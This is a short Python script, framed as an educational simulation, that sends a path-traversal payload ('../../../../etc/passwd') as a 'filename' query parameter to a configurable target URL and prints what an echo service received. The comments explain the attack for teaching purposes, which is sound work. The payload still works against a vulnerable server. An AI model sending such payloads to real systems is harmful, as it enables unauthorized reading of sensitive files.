import requests
import json

import os
from dotenv import load_dotenv
load_dotenv()

# --- Configuration for Educational Simulation ---
# We use a safe echo service to inspect the request, NOT a vulnerable server.
# A real-world attack would target an endpoint that handles file retrieval 
# based on a user-supplied parameter (e.g., /api/getFile?filename=...).
TARGET_URL = os.getenv("TARGET_URL")


# 1. Define the Malicious Traversal Payload
# The goal is typically to escape the current working directory and read sensitive files.
# The payload uses '../' to navigate up directories.
# Example: Attempting to read the system password file on a Linux server.
ATTACK_PAYLOAD = '../../../../etc/passwd'

# 2. Define the Request Parameter
# This simulates an attacker trying to supply the malicious payload to a 
# vulnerable query parameter (e.g., 'file' or 'name').
QUERY_PARAMETERS = {
    "filename": ATTACK_PAYLOAD
}

# --- Request Execution ---
print("--- Starting Path Traversal Simulation (Educational) ---")
print(f"Target URL: {TARGET_URL}")
print(f"Simulated Malicious Parameter: filename={ATTACK_PAYLOAD}")

try:
    # Send the GET request with the parameter
    response = requests.get(
        TARGET_URL,
        params=QUERY_PARAMETERS,
        # Set a user-agent to make the request appear non-malicious to safe echo services
        headers={'User-Agent': 'Educational-Simulator/1.0'}
    )

    # --- Print the exact URL ---
    print(f"Exact URL Sent: {response.url}")

    # --- Response Analysis ---
    print("\n--- Server Response (Echo) ---")
    print(f"Status Code: {response.status_code}")

    if response.status_code == 200:
        response_json = response.json()
        
        # The 'args' section shows how the server received and parsed the URL parameters
        print("\nRequest Parameters Received by Server ('args' field):")
        print(json.dumps(response_json.get('args', {}), indent=4))
        
        # The 'url' field confirms the constructed URL
        print("\nFull URL Constructed:")
        print(response_json.get('url'))

        print("\nNote: A real-world vulnerable server would attempt to load a file using the 'filename' parameter, potentially reading a sensitive file like '/etc/passwd'.")
    else:
        print(f"Request failed with status code {response.status_code}")
        print(f"Response text:\n{response.text}")

except requests.exceptions.RequestException as e:
    print(f"\nAn error occurred during the request: {e}")

print("\n--- Simulation Complete ---")

